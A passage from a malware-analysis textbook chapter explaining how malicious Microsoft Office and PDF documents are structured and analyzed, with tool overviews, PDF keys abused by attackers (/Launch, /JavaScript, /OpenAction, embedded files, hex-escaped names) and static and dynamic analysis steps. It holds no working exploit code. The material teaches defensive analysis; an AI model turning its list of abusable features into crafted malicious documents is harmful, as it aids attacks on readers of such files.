				<li><code>&lt;document_type_specific_directory&gt;</code>: This directory contains the actual document data. Its name depends on the target application. The following are some examples:<ul><li><code>word</code> for Microsoft Word: The main information is stored in the <code>document.xml</code> file.</li><li><code>xl</code> for Microsoft Excel: In this case, the main file will be <code>workbook.xml</code>.</li><li><code>ppt</code> for Microsoft PowerPoint: Here, the main information is located in the <code>presentation.xml</code> file.</li></ul></li>
			</ul>
			<p>Now that we’ve become <a id="_idTextAnchor924"/><a id="_idTextAnchor925"/>familiar with the common document formats, it is time to learn how to analyze malware that utilizes them. </p>
			<h2 id="_idParaDest-281"><a id="_idTextAnchor926"/>Static and dynamic analysis of MS Office exploits</h2>
			<p>In this section, we are going to learn how malicious Microsoft Office documents can be analyzed. Here, we will focus on malware-exploiting vulnerabilities. Macro threats will be covered in <a href="B18500_10.xhtml#_idTextAnchor1106"><em class="italic">Chapter 10</em></a>, <em class="italic">Scripts and Macros – Reversing, Deobfuscation, and Debugging,</em> as they aren’t classed as exploits from a technical standpoint.</p>
			<h3>Static analysis</h3>
			<p>There are quite <a id="_idIndexMarker1278"/>a few tools that allow analysts to look inside original Microsoft Office formats, as follows:</p>
			<ul>
				<li><strong class="bold">oletools</strong>: A unique set <a id="_idIndexMarker1279"/>of several powerful tools that allow an analyst to analyze all common documents associated with Microsoft Office products. The <a id="_idIndexMarker1280"/>following are some examples:<ul><li><strong class="bold">olebrowse</strong>: A pretty basic GUI tool that allows you to browse CFB documents</li><li><strong class="bold">oledir</strong>: Displays directory entries within CFB files</li><li><strong class="bold">olemap</strong>: Shows all sectors present in the document, including the header</li><li><strong class="bold">oleobj</strong>: Allows you to extract embedded objects fr<a id="_idTextAnchor927"/>om CFB files</li><li><strong class="bold">rtfobj</strong>: Pretty much the same functionality as in case of oleobj, but this time for RTF documents</li></ul></li>
				<li><strong class="bold">oledump</strong>: This powerful <a id="_idIndexMarker1281"/>tool gives valuable insight into streams that are present in the document and features dumping and decompression options as well.</li>
				<li><strong class="bold">rtfdump</strong>: Another <a id="_idIndexMarker1282"/>tool by the same author, this time aiming to facilitate the analysis of RTF documents.</li>
				<li><strong class="bold">OfficeMalScanner</strong>: Features several heuristics to search for and analyze shellcode <a id="_idIndexMarker1283"/>entries, as well as encrypted MZ-PE files. For RTF files, it has a dedicated <strong class="bold">RTFScan</strong> tool.</li>
			</ul>
			<p>Regarding the newer Open XML-based files (such as <code>.docx</code>, <code>.xlsx</code>, and <code>.pptx</code>), <strong class="bold">officedissector</strong>, a parser library written in Python that was designed for securely analyzing OOXML files, can be <a id="_idIndexMarker1284"/>used to automate certain tasks. But overall, once unzipped, they can always be analyzed in your favorite text editor with XML highlighting. Similarly, as we have already mentioned, RTF files don’t necessarily require any specific software and can be analyzed in pretty much any text editor.</p>
			<p>When performing static analysis, it generally makes sense to extract macros first if they’re present, as well as check for the presence of other non-exploit-related techniques, such as DDE or PowerPoint actions (their analysis will be covered in <a href="B18500_10.xhtml#_idTextAnchor1106"><em class="italic">Chapter 10</em></a>, <em class="italic">Scripts and Macros – Reversing, Deobfuscation, and Debugging</em>). Then, you need to <a id="_idIndexMarker1285"/>check whether any URLs or high-entropy blobs are present as they may indicate the presence of shellcode. Only after thi<a id="_idTextAnchor928"/>s does it make sense to dig into anomalies in the document structure that may indicate the presence of an exploit.</p>
			<h3>Dynamic analysis</h3>
			<p>Dynamic analysis of <a id="_idIndexMarker1286"/>these types of exploits can be performed in two stages:</p>
			<ul>
				<li><strong class="bold">High-level</strong>: At this stage, you must reproduce, and thus confirm, the malicious behavior. Usually, it involves the following steps:<ol><li><strong class="bold">Figure out the actual exploit payload</strong>: Generally, this part can be done during the static analysis stage. Otherwise, it is possible to set up various behavioral analysis tools (filesystem, registry, process, and network monitors) and search for suspicious entries once the exploit is supposed to trigger during the next step.</li><li><strong class="bold">Identify the product version(s) vulnerable to it</strong>: If the vulnerability has been publicly disclosed, in most cases, it contains confirmed versions of targeted products. Otherwise, it is possible to install multiple versions of it in separat<a id="_idTextAnchor929"/>e VM snapshots so that you can find at least one that allows you to reliably reproduce the exploit being triggered.</li></ol></li>
				<li><strong class="bold">Low-level</strong>: In many cases, this stage is not required as we already know what the exploit is supposed to do and what products are affected. However, if we need to verify the vulnerability’s CVE number or handle zero-day vulnerabilities, it may be required to figure out exactly what bug has been exploited.</li>
			</ul>
			<p>Once we can reliably reproduce the exploit being triggered, we can at<a id="_idTextAnchor930"/>tach it to the targeted module of the corresponding Microsoft Office product and keep debuggi<a id="_idTextAnchor931"/>ng it until we see the payload being triggered. Then, we can intercept this moment and dive deep into how it works.</p>
			<h1 id="_idParaDest-282"><a id="_idTextAnchor932"/>Studying malicious PDFs</h1>
			<p>The <strong class="bold">Portable Document Format</strong> (<strong class="bold">PDF</strong>) was developed by Adobe in the 90s for uniformly presenting <a id="_idIndexMarker1287"/>documents, regardless of the application software or operating system used. Originally proprietary, it was released as an open standard in 2008. Unfortunately, due to its popularity, mul<a id="_idTextAnchor933"/>tiple attackers misuse it to deliver their malicious payloads. Let’s see how they work and how they can be analyzed.</p>
			<h2 id="_idParaDest-283"><a id="_idTextAnchor934"/>File structure</h2>
			<p>A PDF is a tree <a id="_idIndexMarker1288"/>file that consists of objects that <a id="_idIndexMarker1289"/>implement one of eight data types:</p>
			<ul>
				<li><code>Null object</code>: Represents a lack of data.</li>
				<li><code>Boolean values</code>: Classic true/false values.</li>
				<li><code>Numbers</code>: Both integer and real values.</li>
				<li><code>Names</code>: These values can be recognized by a forward slash at the beginning.</li>
				<li><code>Strings</code>: Surrounded by parentheses.</li>
				<li><code>Arrays</code>: Enclosed within square brackets.</li>
				<li><code>Dictionaries</code>: In this case, double curly brackets are used.</li>
				<li><code>Streams</code>: These are the main data storage blocks, and they support binary data. Streams can be compressed to reduce the size of the associated data.</li>
			</ul>
			<p>Apart from this, it is possible to use comments with the help of the percentage (<code>%</code>) sign.</p>
			<p>All complex data objects (such as images or JavaScript entries) are stored using basic data types. In many cases, objects will have the corresponding dictionary mentioning the data type with the actual data stored in a stream.</p>
			<p>PDF documents generally start with the <code>%PDF</code> signature, followed by the format version number (for example, 1.7) separated by a dash. However, because the PDF documents are read from the end, this is not guaranteed, and different PDF viewers allow a different number of arbitrary bytes to be placed in front of this signature (in most cases, at least <code>1000</code>):</p>
			<div><div><img src="img/Figure_8.20_B18500.jpg" alt="Figure 8.20 – Arbitrary bytes in front of the %PDF signature of a valid document&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.20 – Arbitrary bytes in front of the %PDF signature of a valid document</p>
			<p>Multiple keywords <a id="_idIndexMarker1290"/>can define the boundaries and <a id="_idIndexMarker1291"/>types of the data objects, as follows:</p>
			<ul>
				<li><code>%PDF</code> signature):</li>
			</ul>
			<div><div><img src="img/Figure_8.21_B18500.jpg" alt="Figure 8.21 – The xref table in the PDF document&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.21 – The xref table in the PDF document</p>
			<p>Another <a id="_idIndexMarker1295"/>less common option <a id="_idIndexMarker1296"/>is a <strong class="bold">cross-reference stream</strong>, which serves the same <a id="_idIndexMarker1297"/>purpose.</p>
			<ul>
				<li><code>obj</code> keyword <a id="_idIndexMarker1298"/>is prepended by the object number and its generation number (this can be increased when the file is updated later), all separated by spaces:</li>
			</ul>
			<div><div><img src="img/Figure_8.22_B18500.jpg" alt="Figure 8.22 – Example of the object in PDF document&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.22 – Example of the object in PDF document</p>
			<ul>
				<li><strong class="bold">stream/endstream</strong>: This <a id="_idIndexMarker1299"/>can be used to define the streams that store the actual data.</li>
				<li><code>startxref</code> keyword specifying the offset of the index table and the <em class="italic">%%EOF</em> marker.</li>
			</ul>
			<p>The following are the most <a id="_idIndexMarker1301"/>common entries that <a id="_idIndexMarker1302"/>might be of interest to analysts when they’re analyzing malicious PDFs:</p>
			<ul>
				<li><code>/Type</code>: This defines <a id="_idIndexMarker1303"/>the type of the associated object data, The following <a id="_idIndexMarker1304"/>are some examples:<ul><li><code>/ObjStm</code>: The object stream is a complex data type that can be used to store multiple objects. Usually, it is accompanied by several other entries, such as <code>/N</code> for defining the number of embedded objects and <code>/First</code> for defining the offset of the first object inside it. The first line of the stream defines the numbers and offsets of embedded objects, all separated by spaces.</li><li><code>/Action</code>: This describes the action to perform. There are different types, as follows:<ul><li><code>/Launch</code>: Defines the launch action to execute an application specified using the <code>/F</code> value and its parameters using the <code>/P</code> value.</li><li><code>/URI</code>: Defines the URI action to resolve the specified URI.</li><li><code>/JavaScript</code>: Executes a specified piece of JavaScript, <code>/JS</code>, which defines a <a id="_idIndexMarker1305"/>text string or a stream containing a JavaScript block that should be executed once the action (rendition or JavaScript) triggers.</li><li><code>/Rendition</code>: Can<a id="_idIndexMarker1306"/> be <a id="_idIndexMarker1307"/>used to execute JavaScript as well. The same <code>/JS</code> name can be used to specify it.</li><li><code>/SubmitForm</code>: Sends data to the specified address. The URL is provided in the <code>/F</code> entry and might be used in phishing documents.</li></ul></li><li><code>/EmbeddedFiles</code>: This can be used to store an auxiliary file, such as a malicious <a id="_idIndexMarker1308"/>payload.</li><li><code>/Catalog</code>: This is <a id="_idIndexMarker1309"/>the root of the object hierarchy. It defines references to other objects, as follows:<ul><li><code>/Names</code>: An optional document name dictionary. It allows you to refer to some objects by names rather than by references – for example, using <code>/JavaScript</code> or <code>/EmbeddedFiles</code> mappings.</li><li><code>/OpenAction</code>: This specifies the destination to display (generally, this isn’t relevant for malware analysis purposes) or an action to perform once the document has been opened (see the previous list).</li><li><code>/AA</code>: This speci<a id="_idTextAnchor935"/>fies additional actions associated with trigger events.</li></ul></li></ul></li>
				<li><code>/XF</code>: This specifies <a id="_idIndexMarker1310"/>an XML-based form. It can contain embedded JavaScript code.</li>
				<li><code>/Filter</code>: This entry <a id="_idIndexMarker1311"/>defines the decoding filter(s) to be applied to the associated stream so that the data becomes readable. <code>/FFilter</code> can be used in the stream’s external file. For some of them, optional parameters can be specified using <code>/DecodeParms</code> (or <code>/FDecodeParms</code>, respectively). Multiple filters can be cascaded if necessary. There are two main categories of filters: compression filters and ASCII filters. Here are some examples that are commonly used in malware:<ul><li><code>/FlateDecode</code>: Probably the most common way to compress text and binary data, this utilizes the <code>zlib/deflate</code> algorithm:</li></ul></li>
			</ul>
			<div><div><img src="img/Figure_8.23_B18500.jpg" alt="Figure 8.23 – The /FlateDecode filter used in a PDF document&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.23 – The /FlateDecode filter used in a PDF document</p>
			<ul>
				<li><code>/LZWDecode</code>: In this <a id="_idIndexMarker1312"/>case, the LZW <a id="_idIndexMarker1313"/>compression algorithm is used instead.</li>
				<li><code>/RunLengthDecode</code>: Here, the <a id="_idIndexMarker1314"/>data is encoded using the <strong class="bold">Run-Length Encoding</strong> (<strong class="bold">RLE</strong>) algorithm.</li>
				<li><code>/ASCIIHexDecode</code>: Data is encoded using hexadecimal representation in ASCII.</li>
				<li><code>/ASCII85Decode</code>: Another way to encode binary data, in this case using ASCII85 (also known as Base85) encoding.</li>
			</ul>
			<ul>
				<li><code>/Encrypt</code>: An entry in the file trailer dictionary that specifies that this document is <a id="_idIndexMarker1315"/>password protected. The entries in the corresponding object specify the way this is done:<ul><li><code>/O</code>: This entry defines the owner-encrypted document. Generally, it is used for DRM purposes.</li><li><code>/U</code>: This is associated with the so-called user-encrypted document and it is usually used for <a id="_idIndexMarker1316"/>confidentiality. Malware authors may use it to bypass security checks and then give the victim a password to open it.</li></ul></li>
			</ul>
			<p>It is worth mentioning that in the modern specification, it is possible to replace parts of these names (or even the whole name) with <code>#XX</code> hexadecimal representations. So, <code>/URI</code> can become <code>/#55RI</code> or even <code>/#55#52#49</code>.</p>
			<p>Some entries may reference other objects using the letter <em class="italic">R</em>. For example, <code>/Length 15 0 R</code> means <a id="_idIndexMarker1317"/>that the actual length valu<a id="_idTextAnchor936"/><a id="_idTextAnchor937"/><a id="_idTextAnchor938"/>e is stored <a id="_idIndexMarker1318"/>in a separate object, 15, in generation 0. When the file is updated, a new object with the incremented generation number is added.</p>
			<h2 id="_idParaDest-284"><a id="_idTextAnchor939"/>Static and dynamic analysis of PDF files</h2>
			<p>Now, it is time to learn how malicious PDF files can be analyze<a id="_idTextAnchor940"/>d. In this section, we will cover various tools that can assist with the analysis and give some guidelines on when and how they should be used.</p>
			<h3>Static analysis</h3>
			<p>In many cases, static <a id="_idIndexMarker1319"/>analysis can answer pretty much any question that an engineer has when analyzing these types of samples. Multiple dedicated open source tools can make this process pretty straightforward. Let’s explore some of the most popular ones:</p>
			<ul>
				<li><code>-a</code>: Displays stats for the PDF sample</li><li><code>-O</code>: Parses <code>/ObjStm</code> objects</li><li><code>-k</code>: Searches for the name of interest</li><li><code>-d</code>: Dumps the object specified using the <code>-o</code> argument</li><li><code>-w</code>: Raw output</li><li><code>-f</code>: Passes an object through decoders</li></ul></li>
				<li><strong class="bold">peepdf</strong>: Another<a id="_idIndexMarker1321"/> <a id="_idTextAnchor941"/>tool in the arsenal of malware analysts, this provides various useful commands that aim to identify, extract, decode, and beautify extracted data.</li>
				<li><strong class="bold">PDFStreamDumper</strong>: This <a id="_idIndexMarker1322"/>Windows tool combines multiple features into one comprehensive GUI and provides rich functionality that’s required when analyzing malicious <a id="_idIndexMarker1323"/>PDF documents. It is strongly focused on extracting and processing various types of payload hidden in streams and supports multiple encoding algorithms, including less common ones:</li>
			</ul>
			<div><div><img src="img/Figure_8.24_B18500.jpg" alt="Figure 8.24 – The PDFStreamDumper tool&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.24 – The PDFStreamDumper tool</p>
			<ul>
				<li><strong class="bold">malpdfobj</strong>: The authors of this tool took a slightly different approach in that the tool generates <a id="_idIndexMarker1324"/>a JSON containing all the extracted and decoded<a id="_idTextAnchor942"/> information from the malicious PDF to make it more visible. This way it can be easily parsed using a scripting language of preference if necessary.</li>
			</ul>
			<p>Apart from these, multiple tools and libraries can facilitate analysis by parsing a PDF’s structure, decrypting <a id="_idIndexMarker1325"/>documents, or<a id="_idIndexMarker1326"/> decoding<a id="_idIndexMarker1327"/> streams. This includes <strong class="bold">qpdf</strong>, <strong class="bold">PyPDF2</strong>, and <strong class="bold">origami</strong>.</p>
			<p>When performing static analysis for malicious PDF files, it usually makes sense to start by listing the actions as well as the different types of objects. Pay particular attention to the suspicious entries we listed previously. Decode all the encoded streams to see what’s inside as they may contain malicious modules.</p>
			<p>If the JavaScript <a id="_idIndexMarker1328"/>object has been extracted, follow the recommendations for both static and dynamic analysis that have been provided in <a href="B18500_10.xhtml#_idTextAnchor1106"><em class="italic">Chapter 10</em></a>, <em class="italic">Scripts and Macros – Reversing, Deobfuscation, and Debugging</em>. In ma<a id="_idTextAnchor943"/>ny cases, the exploit functionality is implemented using this language. ActionScript is much less common nowadays as Flash Player has been discontinued.</p>
			<h3>Dynamic analysis</h3>
			<p>In terms of <a id="_idIndexMarker1329"/>dynamic analysis, the same steps that were taken for Microsoft Office exploits can be followed:</p>
			<ol>
				<li value="1">Figure out which payload has been exploited.</li>
				<li>Identify the product version(s) vulnerable to it.</li>
				<li>Open the document using the candidate product and use behavior analysis tools to confirm that it triggers.</li>
				<li>Find a place in the code of the vulnerable product where you can trigger the exploit.</li>
			</ol>
			<p>If the actual exploit body is written in some other language (such as JavaScript), it might be more convenient to debug parts of it separately while emulating the en<a id="_idTextAnchor944"/>vironment that’s required for the exploit to work. This will also be covered in <a href="B18500_10.xhtml#_idTextAnchor1106"><em class="italic">Chapter 10</em></a>, <em class="italic">Scripts and Macros – Reversing, Deobfuscation, and Debugging</em>.</p>
			<h1 id="_idParaDest-285"><a id="_idTextAnchor945"/>Summary</h1>
			<p>In this chapter, we became familiar with various types of vulnerabilities, the exploits that target them, and different techniques that aim to battle them. Then, we learned about shellcode, how it is different for different platforms, and how it can be analyzed.</p>
			<p>Finally, we covered other common types of exploits that are used nowadays in the wild – that is, malicious PDF and Microsoft Office documents – and explained how to examine them. With this knowledge, you can gauge the attacker’s mindset and understand the logic behind various techniques that can be used to compromise the target system.</p>
			<p>In <a href="B18500_09.xhtml#_idTextAnchor946"><em class="italic">Chapter 9</em></a>, <em class="italic">Reversing Bytecode Languages – .NET, Java, and More</em>, we will learn how to handle malware that’s been written using bytecode languages, what challenges the engineer may face during the analysis, and how to deal with them.</p>
		</div>
		<div><div></div>
		</div>
	</body></html>